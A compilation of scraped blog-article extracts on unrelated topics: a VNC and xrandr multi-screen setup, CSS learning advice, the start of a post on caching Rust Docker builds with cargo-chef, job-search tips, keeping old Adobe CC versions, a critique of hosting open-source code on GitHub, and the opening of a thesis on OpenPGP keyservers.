</code></pre></div><p>Now on the main laptop, we will simply leverage <code>x2vnc</code> to extend into the secondary laptop.</p><p>Where we can get the IP (local) by checking with <code>ifconfig</code> on the secondary laptop.</p><h4 id="meta">Meta</h4><p>This works best when combined with a networked file-system, since then you can interact with files in tandem. Otherwise, there is quite a bit of <code>git</code> based back and forth.</p><h2 id="vnc-and-android">VNC and Android</h2><p>There are two parts to this solution. Note that, as Android devices don’t run X11 systems in a meaningful way, the direct access method is through a paid application, a2vnc server lite, which also did not work well in my tests. We will therefore focus on setting a VNC viewer up to connect to the primary laptop.</p><h3 id="primary-settings">Primary Settings</h3><h4 id="xrandr-setup">XRandR Setup</h4><p>For the primary laptop, we will start by obtaining our present screens configuration.</p><div><pre><code data-lang="bash">xrandr <span>|</span> grep <span>" connected"</span>
</code></pre></div><div><pre><code data-lang="bash">eDP1 connected primary 1920x1080+1920+0 <span>(</span>normal left inverted right x axis y axis<span>)</span> 290mm x 170mm
</code></pre></div><p>Naturally your output will differ. We also need the resolution of the Android device. In my case, they are the same. At this point we are ready to figure out the mode-line.</p><div><pre><code data-lang="bash"><span># 1920x1080 @ 60.00 Hz (GTF) hsync: 67.08 kHz; pclk: 172.80 MHz</span>
Modeline <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Let us now use this information to create a bunch of modelines.</p><div><pre><code data-lang="bash">xrandr --newmode <span>"1920x1080_60.00"</span>  172.80  <span>1920</span> <span>2040</span> <span>2248</span> <span>2576</span>  <span>1080</span> <span>1081</span> <span>1084</span> <span>1118</span>  -HSync +Vsync
</code></pre></div><p>Note that we can create more of these in the same manner. We can now move forward with making a virtual screen.</p><div><pre><code data-lang="bash">xrandr --addmode VIRTUAL1 1920x1080_60.00
</code></pre></div><p>We can now finally set up the output.</p><div><pre><code data-lang="bash">xrandr --output VIRTUAL1 --mode 1920x1080_60.00 --left-of eDP1
</code></pre></div><p>Note that it is better to use <code>mons</code> to work with our newly created virtual screen.</p><p>This is still a bit ugly, since the process needs to be repeated with each reboot.</p><h4 id="vnc-setup">VNC Setup</h4><p>Now we need prepare our VNC. <code>x11vnc</code> is recommended at the moment.</p><div><pre><code data-lang="bash">x11vnc -vencrypt nodh:only-ssl -ssl SAVE -clip 1920x1080+0+0
</code></pre></div><h3 id="android-settings">Android Settings</h3><p>For this section, I personally use <a href="https://play.google.com/store/apps/details?id=com.iiordanov.bVNC&amp;hl=en&amp;gl=US">bVNC Pro</a>. The setup is pretty dead simple. A basic VNC connection is all that is required.</p><p>In practice, I use the x86 setup, with the secondary laptop acting as a viewer for a virtual screen, mostly because that way I can tune into multiple Zoom meetings (a bonus).</p><h2 id="conclusion">Conclusion</h2><p>The final setup is quite robust to changes. Future posts might go into setting up the kind of local networking tools to help move files, code and more between both machines, to improve on the peripheral share approach. Additionally, there are still some manual steps which can and should be automated. I’m not super pleased with the setup, it takes longer than a wireless screen. This post is complimented by the <a href="https://rgoswami.me/posts/multi-monitor-touch/">work and setup with touchscreens here</a>.</p></div></div>]]>

October 23, 2020 | https://planflow.dev/blog/how-to-get-better-at-css | <a href="https://web.archive.org/web/*/https://planflow.dev/blog/how-to-get-better-at-css">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>The key reason why you (and likely most developers) struggle with CSS, is that you underestimate it.</p><p>Underestimating CSS leads to a strange feeling of tediousness when writing it, which makes having to deal with it a laborious and seemingly unrewarding task. Style by style, div by div, media query by media query. Having to make endless small tweaks in what feels like an open-ended ‘design’ process with no direction at all can feel like torture to a development-oriented mind.</p><p>Not to mention a complete lack of debugging tools and methods available for when things go wrong.</p><p>This underestimation is a subset of a problem that we developers tend to have with design in general. In short, we don’t think it’s that important. We don’t understand or appreciate its <em>meaning</em>.</p><p>In reality, CSS is as complicated, maybe more so, as any programming language or framework you will ever come across.</p><p>But the general feeling that it is an afterthought within the development process overall, only adds fuel to fire of the thought that leads you to feel that it is tedious.</p><p>The best way to start to get better at it then, is to gain a new appreciation for it, as a 'hard', technical thing. Which it is.</p><p><strong>You do this by reframing how you see it.</strong></p><p>You can start to learn to like CSS by understanding it from a problem solving technical aspect. As an act of 'constructing' a page rather than 'designing' it. By <a target="_blank" title="https://simpleprogrammer.com/information-architecture-developers-learning-design/" href="https://simpleprogrammer.com/information-architecture-developers-learning-design/">engaging the engineering side of your mind</a>.</p><p>Instead of seeing CSS as an annoying way to 'style' pages, see it instead as a visual programming language for constructing visual guides (UI's) for your user.</p><p>You don't 'style' pages, you 'construct' and 'architect' them. It sounds weird to use these words, but they have a massive effect on changing your perception of what you're doing. And that has a massive effect on your impression and willingness to learn how to do it well.</p><p>Essentially, you can properly learn CSS by transforming it in your mind from a 'styling' problem thing, to an 'engineering' problem thing.</p><p>This defeats the feeling of tedium that your mind has when you’re dealing with CSS, and over time, if applied with some of the specific additional tactics that I will explain below, leads to actually _enjoying_ the process of writing CSS.</p><h2>Tactics That Reduce CSS Tediousness &amp; Lead To CSS Enjoyment</h2><p>Once you’ve started to reframe the act of utilizing CSS in your mind, and start to see it as more of a tool for an engineering problem rather than a ‘design’ problem, embers of enjoyment will start to emerge within you as you are writing your CSS. From here, you can start to add some fuel to the growing fire. </p><p>You can do this by utilizing some strategies, tools and techniques that further reduce the tediousness of CSS. </p><p><strong>Let’s go through them.</strong></p><h3>Use tediousness reducing tools, such as <a target="_blank" title="https://tailwindcss.com/" href="https://tailwindcss.com/">TailwindCSS</a>. So you can abstract CSS.</h3><p>I remember back a few years ago when the <a target="_blank" title="https://laravel.com/" href="https://laravel.com/">Laravel Framework</a> came out. PHP Programmers all over the web were fawning over it. The most common phrase I heard was that it gave programmers “their enjoyment of programming” back. This with a language that was notoriously derided as one that was tedious to use.</p><p>What Laravel did was abstract a lot of the annoying parts of most of these developers' workflows when writing PHP code. These developers, at this newfound higher level of abstraction, could now focus on ‘crafting’ their applications, becoming ‘artisans’ of their code rather than simply PHP programmers.</p><p>TailwindCSS does the same thing for CSS. Instead of moving from one file to another to define your styles, Tailwind uses standard default class presets that allow you to write your CSS, essentially directly onto your HTML elements. This <a target="_blank" title="https://news.ycombinator.com/item?id=24034619" href="https://news.ycombinator.com/item?id=24034619">might sound weird</a> at first, but in the end, actually results in a LOT of saved time in development.</p><p>Over time, it, along with other tools, such as Flexbox, also massively increases enjoyment, as you start to intuitively ‘craft’ and construct pages at a higher level of abstraction, rather than simply ‘style’ them.</p><p><strong>Fun fact</strong><strong>:</strong> The creator of TailwindCSS, <a target="_blank" title="https://twitter.com/adamwathan" href="https://twitter.com/adamwathan">Adam Wathan</a> actually started out as a Laravel Developer, so maybe that enthusiasm crossed over to his other project areas.</p><p><strong>EDIT</strong><strong>:</strong> I recently came across a very nice feature in Firefox that helps in debugging overflow issues (one of the most common CSS problems). You can see it in action <a target="_blank" title="https://twitter.com/violasong/status/1314406711696912386" href="https://twitter.com/violasong/status/1314406711696912386">here</a>.</p><h3>Understand how to solve common problems in CSS</h3><p>Because of the lack of debugging tools that are currently available for CSS. Most of debugging within it largely consists of cross-referencing ways that others have dealt with the issue you’re currently facing.</p><p>While this is likely not an uncommon practice in your development workflow (its why StackOverflow exists), it is very time consuming if it is the ONLY way that you can debug. </p><p>One way around this issue is to become familiar with the most common pattern of problems that occur within CSS, and then try to build a repository of solutions to those problems in your mind over time. This sounds simple enough but it very dramatically decreases tedium and increases productivity and speed of development, which ultimately increases your enjoyment.</p><p>For example, one of the most common issues, as referenced in the post drawing, is ‘overflow’ of elements occurring within the page. Sometimes causing the entire page itself to overflow at certain screen sizes. A tutorial like this, outlines the best way to solve this problem.</p><p><strong>Sidenote</strong><strong>:</strong> We are creating a short ebook that deals with this problem, by outlining these most common CSS problems and their solutions, you can sign up for notification of this here: <a target="_blank" title="https://forms.gle/tXRMnpyUZiFmvZwK8" href="https://forms.gle/tXRMnpyUZiFmvZwK8">How To Debug CSS</a>.</p><h3>Master layouts and positioning in CSS (the most tedious aspect of it)</h3><p>As a follow-on to the above point on simply gaining an understanding of the most common aspects of the CSS writing process, the most common of these in terms of general page creation, is that of simply layout out a page, and its elements and making sure that they are positioned and aligned properly. </p><p>The best way to approach problems in a way that solves them most effectively is in an 80/20 way. Mastery of layouts and positioning is the 20% that leads to the 80% of results with CSS. And what will have the most dramatic effect on reducing the tediousness of your CSS writing process.</p><p>Using tools such as Flexbox, as is mentioned above, also makes layouts and positioning twice as easy, once you understand the fundamentals behind it. </p><p>Overall, it’s with this knowledge that you may start to enjoy and view the process as ‘constructing’ pages, rather than simply ‘styling’ them.</p><h3>Practice regularly until it becomes second nature</h3><p>One simple thing that I found, as I started to implement some of the tactics above into my own workflow, was that as I became more proficient in writing CSS and it started to become second nature, my enjoyment of it also started to increase, which lead to a positive feedback loop that kept increasing my overall ability.</p><p>This is a very positive flywheel that I highly encourage. Once you’ve started to change your mindset about CSS and use the right tools to abstract a lot of the tediousness out of it, practicing it regularly is then like adding jet fuel to your workflow. Eventually, CSS will become something you look forward to, rather than an afterthought that you try to avoid.</p></div></div>]]>

<p>Rust shines at runtime, consistently delivering great performance, but it comes at a cost: compilation times.<br>
They have been consistently among the top answers in the Rust annual survey when it comes to <a href="https://blog.rust-lang.org/2020/04/17/Rust-survey-2019.html#rust-adoption---a-closer-look"><em>the biggest challenges or problems for the Rust project</em></a>.</p>
<p>Optimised builds (<code>--release</code>), in particular, can be gruesome - up to 15/20 minutes on medium projects with several dependencies. Quite common on web development projects pulling in many foundational crates from the async ecosystem (<code>tokio</code>, <code>async-std</code>, <code>actix-web</code>, <code>tonic</code>, <code>lapin</code>, etc.).</p>
<p>How does this impact your day-to-day if you are working on a Rust project?</p>

<p><a href="https://www.docker.com/">Docker</a> containers are a mainstream technology to deploy software in production environments - most organisations have a Continuous Integration/Continuous Deployment pipeline that clones a project from a version control system (e.g. GitHub) and builds a Docker image to be deployed on top of a container orchestrator (e.g. <a href="https://kubernetes.io/">Kubernetes</a>, <a href="https://www.nomadproject.io/">Nomad</a> or other commercial solutions).</p>
<p>In a Docker build you will always be using the optimised build profile (<code>--release</code>) to get top-performance in your production environment. More often than not CI/CD pipelines do not run on top of very beefy machines - a couple of cores, maybe, not much more than that.</p>
<p>This combination is deadly.<br>
It can take more than 30 minutes to go from a merged PR to rolling out the new version to your end-users.</p>
<p>Such a long delay can have nefarious knock-on effects.</p>
<h2 id="slow-docker-builds-will-kill-you">Slow Docker builds will kill you</h2>
<p>Slow Docker builds will, over time, reduce your deployment frequency.<br>
<a href="https://www.amazon.co.uk/Accelerate-Software-Performing-Technology-Organizations/dp/1942788339">Accelerate</a> has taught you to optimise for small changes deployed multiple times a day. But if each build takes ages it is very unlikely that your engineers will be willing to go through the ordeal often.<br>
They will start batching up changes, making it much more likely than one of those deployments will result in an outage. </p>
<p>Slow Docker builds will bite you again during those outages: the speed of your CI pipeline puts a hard limit on how fast you can roll out an emergency patch to mitigate an incident ("fix forward").<br>
If it takes 20 minutes to build a Docker container then the incident will be <em>at least</em> 20 minutes long (assuming you find the right fix as soon as the incident happens - unlikely).</p>
<p>In other words - do not neglect your CI/CD pipeline. It impacts your bottom line.</p>
<blockquote>
<p>Ok, ok, you convinced me! I want fast Docker builds! How?</p>
</blockquote>

<p>Let's have a look at your typical Rust Dockerfile:</p>
<pre><code><span>FROM</span><span> rust </span><span>as </span><span>builder
</span><span>WORKDIR </span><span>app
</span><span>COPY</span><span> . .
</span><span># This works with the dummy project generated by `cargo new app --bin`
</span><span>RUN </span><span>cargo build --release --bin app

</span><span>FROM</span><span> rust </span><span>as </span><span>runtime
</span><span>WORKDIR </span><span>app
</span><span>COPY</span><span> --from=</span><span>builder</span><span> /app/target/release/app /usr/local/bin
ENTRYPOINT ["</span><span>./usr/local/bin/app</span><span>"]
</span></code></pre>
<p>It is a <a href="https://docs.docker.com/develop/develop-images/multistage-build/"><em>multi-stage</em> build</a>: we create an intermediate Docker image (<code>builder</code>) to compile our binary and then we copy that binary over to the final Docker image (<code>runtime</code>) where we actually run it.<br>
The <code>builder</code> stage often requires more dependencies (e.g. OS packages) than the runtime stage, which can be kept fairly slim leading to smaller images with minimal attack surface.</p>
<p>If you run <code>docker build -t dummy-image .</code> you will see something like this in your terminal:</p>
<pre><code><span>Sending build context to Docker daemon  41.47kB

</span></code></pre>
<p>Each <code>RUN</code>, <code>COPY</code> and <code>ADD</code> instruction creates <a href="https://dzone.com/articles/docker-layers-explained">a <em>layer</em></a>: a diff between the previous state (the layer above) and the current state after having executed the specified command.<br>
Layers are cached.<br>
If the starting point of an operation has not changed (e.g. the base image) and the command itself has not changed (e.g. the checksum of the files copied by <code>COPY</code>) Docker does not perform any computation and directly retrieves a copy of the result from the local cache.</p>
<p>We can see it in action by running again <code>docker build -t dummy-image .</code>:</p>
<pre><code><span>Sending build context to Docker daemon  41.47kB

</span></code></pre>
<p>Notice the <code>Using cache</code> log after every single step. No output at all from <code>cargo build</code> - execution has been skipped entirely. </p>
<p>Docker layer caching is <em>fast</em> and can be leveraged to massively speed up Docker builds.<br>
The trick is optimising the order of operations in your Dockerfile: anything that refers files that are changing often (e.g. your source code) should appear as late as possible, therefore maximising the likelihood of the previous step being unchanged and allowing Docker to retrieve the result straight from the cache.</p>
<p>The expensive step is usually compilation.<br>
Most programming languages follow the same playbook: you <code>COPY</code> a lock-file of some kind first, build your dependencies, <code>COPY</code> over the rest of your source code and then build your project.<br>
This guarantees that most of the work is cached as long as your dependency tree does not change between one build and the next.</p>
<p>In a Python project, for example, you might have something along these lines:</p>
<pre><code><span>FROM</span><span> python:3
</span><span>COPY</span><span> requirements.txt
</span><span>RUN </span><span>pip install -r requirements.txt
</span><span>COPY</span><span> src/ /app
</span><span>WORKDIR </span><span>/app
CMD ["</span><span>python</span><span>", "</span><span>app</span><span>"]
</span></code></pre>
<p>What about Rust?</p>

<p><code>cargo</code>, as of today, does not provide a mechanism to build your project dependencies starting from its <code>Cargo.lock</code> file (e.g. <code>cargo build --only-deps</code>).<br>
Therefore Rust projects have always struggled to leverage Docker layer caching properly.</p>
<p>If you search for "Rust Docker cache" on Google you will bump into a variety of articles that propose a variety of workarounds.<br>
The <a href="https://stackoverflow.com/questions/58473606/cache-rust-dependencies-with-docker-build">blessed answer on StackOverflow</a>, as many other blog posts, suggests the following steps to unlock Docker layer caching for a simple project: copy the lock file, create a dummy <code>main.rs</code> file, build the project, delete the dummy file, copy over your source code, build again.</p>
<pre><code><span>FROM</span><span> rust
</span><span>WORKDIR </span><span>/var/www/app
</span><span>COPY</span><span> dummy.rs .
</span><span>COPY</span><span> Cargo.toml .
</span><span>RUN </span><span>sed -i '</span><span>s#src/main.rs#dummy.rs#</span><span>' Cargo.toml
</span><span>RUN </span><span>cargo build --release
</span><span>RUN </span><span>sed -i '</span><span>s#dummy.rs#src/main.rs#</span><span>' Cargo.toml
</span><span>COPY</span><span> . .
</span><span>RUN </span><span>cargo build --release
CMD ["</span><span>target/release/app</span><span>"]
</span></code></pre>
<p>It is a bit cumbersome but you can live with it for a simple single-binary project. You just need to keep your Dockerfile up to date every time you restructure your file structure (and book some time to explain to your colleagues what the hell you are doing).</p>
<p>As soon as your project grows in complexity (e.g. a workspace with a few crates) this "workaround" leads to an entangled mess that is painful to watch (and maintain).</p>
<p>I am currently finalising the chapter of <a href="https://zero2prod.com/">Zero To Production In Rust</a> on deployment best-practices for Rust projects - I have no intention of teaching this workaround as the best-way to get fast Docker builds with Rust.<br>
I set out to build something nicer and less error-prone.</p>

<p><a href="https://github.com/LukeMathWalker/cargo-chef"><code>cargo-chef</code></a> is a new <code>cargo</code> sub-command.<br>
You can install from <a href="https://crates.io/">crates.io</a> with</p>
<pre><code><span>cargo</span><span> install cargo-chef
</span></code></pre>
<p><code>cargo-chef</code> exposes two commands: <code>prepare</code> and <code>cook</code>:</p>
<pre><code><span>cargo</span><span> chef</span><span> --help
</span></code></pre><pre><code><span>
cargo-chef

USAGE:
    cargo chef &lt;SUBCOMMAND&gt;

SUBCOMMANDS:
    cook       Re-hydrate the minimum project skeleton identified by `cargo chef prepare` and
               build it to cache dependencies
    prepare    Analyze the current project to determine the minimum subset of files (Cargo.lock
               and Cargo.toml manifests) required to build it and cache dependencies
</span></code></pre>
<p><code>prepare</code> examines your project and builds a <em>recipe</em> that captures the set of information required to build your dependencies.</p>
<pre><code><span>cargo</span><span> chef prepare</span><span> --recipe-path</span><span> recipe.json
</span></code></pre>
<p>Nothing too mysterious going on here, you can examine the <code>recipe.json</code> file: it contains the skeleton of your project (e.g. all the <code>Cargo.toml</code> files with their relative path, the <code>Cargo.lock</code> file if available) plus a few additional pieces of information.<br>
In particular it makes sure that all libraries and binaries are explicitly declared in their respective <code>Cargo.toml</code> files even if they can be found at the canonical default location (<code>src/main.rs</code> for a binary, <code>src/lib.rs</code> for a library).</p>
<p>The <code>recipe.json</code> is the equivalent of the Python <code>requirements.txt</code> file - it is the only input required for <code>cargo chef cook</code>, the command that will build out our dependencies:</p>
<pre><code><span>cargo</span><span> chef cook</span><span> --recipe-path</span><span> recipe.json
</span></code></pre>
<p>If you want to build in <code>--release</code> mode:</p>
<pre><code><span>cargo</span><span> …</span></code></pre></article></section></div>

They had an event on personal branding and CV writing and technical interviews. I talked about: </p><ul role="list"><li>How to Build a Resume</li><li>How to Use Linkedin Professionally</li><li>How I Landed a Full-Time Job Without a CS Degree</li></ul><p>Here is the presentation if you want to have a look: <a href="https://careerlaunch.netlify.app/">career launch</a></p><p>In this blog post, I'm going to emphasize the last point and will try to deliver all the messages I&nbsp;gave at that talk and also elaborate more to help more people who are looking for jobs in the software industry to get their dream jobs efficiently and I&nbsp;hope it'll be easier for them to know these tips beforehand because I've been into this situation before and I&nbsp;consider myself lucky and more importantly was doing some productive stuff that helped me get that opportunity and I'm looking forward to helping as many as possible whether you are a recent grad or someone who is not satisfied with their current position and want a change. Here are my tips:</p><h2>Treat your job search as a job</h2><p>Ever felt frustrated after being rejected without even interviewing you?</p><p>Well, I've been there. It's not twice, 10s of times, but 100s of times rejected. </p><p>Looking for a job is actually a job or maybe more than it looks. I&nbsp;know it's hard to not get rewarded, but the hard work you put in will pay off insha'Allah. What I&nbsp;mean by 'treat it as a job' is that you may spend more than 8 hours (like a full-time job or more) because you're doing two things:</p><ol start="" role="list"><li>You apply for jobs and polish your resume</li><li>You also learn and do projects</li></ol><h2>Keep learning while applying</h2><p>Sometimes it's difficult for you to multitask, but it's very important to learn while you apply because you never know when opportunities will be closed and no time for it to be reopened again. You'll never know the psychology of the recruiter and what they like or need in the candidate; maybe your skills at this point in time is needed. So it's better to sharpen your skills and improve your knowledge while applying instead of just waiting for learning ALL&nbsp;the things you want to learn because we always keep learning and no matter how successful we are in the career, the software industry needs a more fulfilling learning curve.</p><h2>Build a portfolio</h2><p>Now, you may wonder how you can build a portfolio without having even a single project to demonstrate. Well, try to build one then!</p><p>Building a portfolio is a boosting step that can make you better demonstrate your skill set and what you’re doing and what ideas your mind has. This should definitely be in your favor if done right to impress the recruiter and to stand out.</p><p>If you have just even one project, talk about it in a blog post and demonstrate in a way that a non-technical person can read and understand. I can’t emphasize enough how you should be able to convince people in the non-technical world to feel your words and your application that you made something.</p><p>Here is <a href="https://ezzeddin.github.io/" target="_blank">my portfolio</a> that I made on a GitHub page hosted by Jekyll which is a static site generator and if you think this portfolio is a bit advanced for you to make, I actually was using another simpler one without complicated CSS styles or many structures in there. It was plain simple and I put the link in the resume and it was BOOM 💥 ACCEPTED!</p><h2>Build an end-to-end project</h2><p>Many applicants try to improve their skills by just learning and not doing a project. It’s very important to build the big picture of what you’re doing and this is mostly done by demonstrating it through a project.</p><p>Try to apply what you’re already learning and do a project with these skills; maybe in an assignment at the end of a course but try to do it in a different way (I mean the data that you’re interested in and the technology that you use often) and what I mean by the end-to-end project is to have a project that demonstrates all lifecycle of software (data collection, analysis, design, testing, deployment). These are real-world skills that companies need. In the end, you’ll have something like a product that you can show to recruiters and maybe they can try it if it’s a web or mobile application for example.</p><p>And it will help you learn new skills without the need to get a whole course about it; maybe a tutorial in a blog will help or a youtube video.</p><h2>Write some content</h2><p>Writing is a very good way to demonstrate what you’ve learned or convince people to buy something which is what we want here, we want the recruiter to finally buy you (not literally) and know the skills that you learned in well-written documentation. Whether this content is the documentation for your project at GitHub (like I did with <a href="https://github.com/EzzEddin/classicle" target="_blank">Classicle</a>) or at medium (like <a href="https://medium.com/@ezzeddinabdullah/from-electronics-and-communications-engineering-to-data-science-a373448a783d" target="_blank">my story from engineering to data science</a>) or a tutorial you to demonstrate your skills in a popular magazine (like <a href="https://www.kdnuggets.com/2018/09/sql-case-study-helping-startup-ceo-manage-data.html" target="_blank">SQL Case Study</a> published at KDnuggets which was converted to a <a href="https://www.udemy.com/intuitive-sql-databases-case-study" target="_blank">basic course on Udemy</a> which&nbsp;I&nbsp;have a 50%&nbsp;discount btw if you subscribe to my newsletter at the bottom)</p><p>You can also publish the same content in another platform like <a href="https://www.experfy.com/blog/sql-case-study-helping-a-startup-ceo-manage-his-data" target="_blank">here</a> when the Industry Partnership Director of experfy reached out to me on Linkedin to republish the KDnuggets article on his website.</p><h2>Focus on jobs in your own country</h2><p>This tip is especially for fresh grads, I understand the high hope as I was in a similar situation someday; my mistake was that I was targeting companies abroad including FAANG without having experience here. I don't say it's impossible to have that as a fresh grad especially after 14 months of the army, but I'd say it'd be better to target companies in your land at first and finish applying to them all and after that apply for other companies abroad.</p><p>Truth be told, I&nbsp;was rejected A&nbsp;LOT. I&nbsp;mean like ~1000 rejections abroad and here in Egypt. Keep trying, you'll gonna find your dream job soon or later.<br></p><h2>Conclusion</h2><p>Wrapping this up, it’s very practical to treat your job hunt as if you’re getting paid for it and don’t regret spending time on it because it usually takes more than 8 hours a day to do your learning and apply for jobs you’re interested in. It’s also important to have a portfolio that demonstrates an end-to-end project or more and better to have other stuff like non-technical blog posts. Writing content in a popular journal will definitely boost your job search and also your skillset. Finally, especially if you’re a recent grad be sure to apply in your own country first and then think about applying abroad.</p><p>If you haven’t found your dream job yet, I hope you’ll do, and if you have it and not satisfied I hope you’ll find your way to better be satisfied and more fulfilled.</p><h2>Resources</h2><ul role="list"><li><a href="https://github.com/EzzEddin/career-slides">Career Launch Slides Repo</a></li><li><a href="http://careerlaunch.netlify.app/">Career Launch Presentation on the Web</a> </li><li><a href="https://money.usnews.com/money/blogs/outside-voices-careers/2012/09/18/8-commandments-for-every-job-hunter">8 Commandments for Every Job Hunter</a></li></ul></div></div></div></div>]]>

<p><span><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27480%27%20height%3D%27270%27%20viewBox%3D%270%200%20480%20270%27%3E%3Crect%20width%3D%27480%27%20height%3D%273270%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_UpdateRemoveOld.gif" alt="Install updates without removing old versions of Adobe CC apps" width="480" height="270"></span></p>
<p><span>You can also enable auto-update and tell it to keep your old versions.</span></p>

<h3><span>How do I get back a previous version of an Adobe CC application that was unintentionally removed?</span></h3>
<p><span>This option is a little less hidden than it has been in the past. It really is quite simple:</span></p>
<p><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%27http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%27%20width%3D%27480%27%20height%3D%27270%27%20viewBox%3D%270%200%20480%20270%27%3E%3Crect%20width%3D%27480%27%20height%3D%273270%27%20fill-opacity%3D%220%22%2F%3E%3C%2Fsvg%3E" data-orig-src="https://www.siliconpublishing.com/wp-content/uploads/2019/11/CC_OtherVersions.gif" alt="Install previous Adobe app versions with the Other Versions option" width="480" height="270"></p>


<p><span>With the recent release of Adobe CC 2021, we’ve fielded the same questions that we received with previous Creative Cloud updates. Three main questions arise:</span></p>
<ol>
<li>Why would I want to keep a previous version of Adobe CC apps (such as InDesign) around?</li>
<li>How do I keep previous versions of an Adobe CC application as I install the new one?</li>
<li>How do I install a previous version of an Adobe CC application when I find it was unintentionally removed?</li>
</ol>
<h3>Why might I want to keep previous versions of Adobe CC applications (such as InDesign) around?</h3>
<p>Out with the old, in with the new, right? In this age of phones and app stores, software moves at a much faster pace than traditional PC applications, especially those in the world of print and serious graphics. The average App Store application has a lifespan of one month, and “auto-update” is all the rage among web browsers, phone apps, even PC applications. Plus, with the modern subscription paradigm, as embraced by Adobe these days, upgrading is FREE! It is also free to keep older versions.</p>
<p>Sure, you can take the plunge, easily, but there may be reasons to pause and consider, “should I kill the old version while moving to the new?” I think the reality is that users should install the new CC 20XX version when available. Yet, in most cases, <strong>it is a best practice to keep the older version as well.</strong></p>
<h4>Why might I want to keep the previous version of CC around?</h4>
<p>There are at least two reasons you may wish to keep CC 2019 on your computer while you install CC 2020:</p>
<ol>
<li>You have validated production workflows in CC 2019 and <strong>haven’t yet tested</strong> these in CC 2020.</li>
<li>Your workflow includes <strong>third-party plugins that don’t yet work with CC 2020. </strong>In most cases, it takes anywhere from a few days to a few months for third-party developers to update their plugins to the new CC version.</li>
</ol>
<h4>You don’t need to choose between CC 2020 and CC 2021!</h4>
<p>As far as Adobe software goes, the upgrade decision doesn’t need to be either/or between the new and previous version. This seems to be a very common mis-conception. <strong>Versions of InDesign and other CC apps co-exist quite nicely.&nbsp;</strong>This has been the case from time immemorial. It has always been an option to <strong>add</strong> the new version <strong>without removing</strong> the older version.</p>
<p>You might think this is a Boolean decision – just one version or the other – because CC apps by default will remove old versions on install. But no, <strong>it is easy to choose to keep the previous version</strong> (though this would be the default, in an ideal world) if you know how to do it.</p>
<p><span>Please&nbsp;<a href="mailto:maxdunn@siliconpublishing.com" rel=" noopener">email us</a> if you can’t figure out how to put back a previous version, or if you have questions about maintaining multiple versions of Creative Cloud applications.</span></p>

<p>Published on <span id="published">2020-10-23</span>. Modified on <span id="modified">2020-10-25</span>.</p>
<p>Thousands of the worlds best Open Source projects are still hosting their code repositories on GitHub. Since Microsoft has purchased GitHub this has become a serious problem.</p>
<p><strong>Update 2020-10-25:</strong> This is not directly related as it could happen on other hosting platforms as well, but just a few hours after I wrote this the youtube-dl repository was taken down from GitHub by RIAA due to a <a href="https://github.com/ytdl-org/youtube-dl/">DMCA request</a>.</p>
<p>It is no news that <a href="https://en.wikipedia.org/wiki/GitHub#Acquisition_by_Microsoft">Microsoft purchased GitHub in 2018</a>, everyone knows that. Yet despite that fact thousands of the worlds most important Open Source projects continue to host their code on GitHub. People seem to have forgotten just how rotten Microsoft really is and how dangerous that situation is.</p>
<p>It is not so much the fact that many projects host their projects on GitHub, it is the fact that many projects haven't secured the code outside of GitHub! They rely fully on GitHub to maintain and protect the code.</p>
<p>Microsoft is very actively purchasing important projects related to Open Source and in April 2020 it was announced that they had now also acquired <a href="https://en.wikipedia.org/wiki/Npm_(software)">npm</a>, a JavaScript packaging vendor, for an undisclosed sum of money.</p>
<p>Perhaps the younger generation don't know anything about the past "evils" of Microsoft and naively believe that Microsoft is now the good friend to Open Source, but the truth is that all these acquisitions of Open Source projects is a business tactic that is put in place to improve Microsoft's loosing position to Open Source. It is a matter of control.</p>
<p>Just yesterday <a href="https://www.minecraft.net/en-us/article/java-edition-moving-house">Microsoft announced</a> that Minecraft will require a Microsoft account to play in 2021 and that owners of the classic version will be forced to migrate.</p>
<p>While this is not related to Open Source, it is a really good example of how bad it can get if Microsoft sometime in the future decides that projects on GitHub are required to do something which goes against these projects interests.</p>
<p>I will not name any names, because that is not important, but how in the world can any Open Source project that regards their code base as valuable not make sure that they have a completely up to date copy of every single line of code outside of GitHub!?</p>
<p>Some project developers only keep parts on the code in personal repositories, others haven't even got a backup but trust fully that GitHub will always have a working and current release of the latests commits.</p>
<p>For years people have warned about the position GitHub had in the world of Open Source because it concentrates too much of the power to make or break the community in a single entity. Having Microsoft behind the steering wheel makes the situation a thousand times worse.</p>
<p>Nobody in their right mind would ever have imagined uploading Open Source code to Microsoft servers just a decade ago. Microsoft where the archenemy of Open Source in the nineties and they deployed all kinds of dirty tactics to keep other operating systems out of the market, especially dirty tactics against Linux. In the early 2000s the then CEO Steve Ballmer said, <q>Linux is a cancer that attaches itself in an intellectual property sense to everything it touches.</q> And for many years they tried to gain control over Linux and manipulated the market in different ways in order to "crush the competition". When they realized they couldn't do that and that the battle was lost, they deployed a new tactic in which they instead try to make money of Linux, which is what that are doing now in a lot of areas, and which is why they seem "friendlier" to the Open Source community.</p>
<p>I myself do have some code residing on GitHub, but of course I also have multiple up-to-date clones and backups elsewhere. However, having the worlds largest repository of important Open Source code reside in the hands of Microsoft is just madness. Why haven't all the major projects migrated? Running a self-hosting Git server isn't that difficult and there even exists several solutions that are pretty solid.</p>
<p>More and more of all the good stuff about Open Source and community driven development and sharing of resources, code and experience is slowly getting either gobbled up or ruined and massacred by big corporations or economically based foundations. Why is it that as soon as money enters into the picture so many things are turned into "crap"? Of course, greed is the answer, but an even more important question than that is: Why is it that we have stopped caring?</p>
<p>Large projects should self-host their repositories in order to stay completely independent, but some alternative solutions to the more popular services such as GitHub, GitLab and BitBucket does exist (not an exhaustive list):</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                <p>In July I finished my Bachelor’s Degree in IT Security at the University of
Applied Sciences in St. Poelten. During the studies I did some elective
courses, one of which was about Data Analysis using Python, Pandas and Jupyter
Notebooks. I found it very interesting to do calculations on different data
sets and to visualize them. Towards the end of the Bachelor I had to find a
topic for my Bachelor Thesis and as a long time user of OpenPGP I thought it
would be interesting to do an analysis of the collection of OpenPGP keys that
are available on the keyservers of the SKS keyserver network.</p>
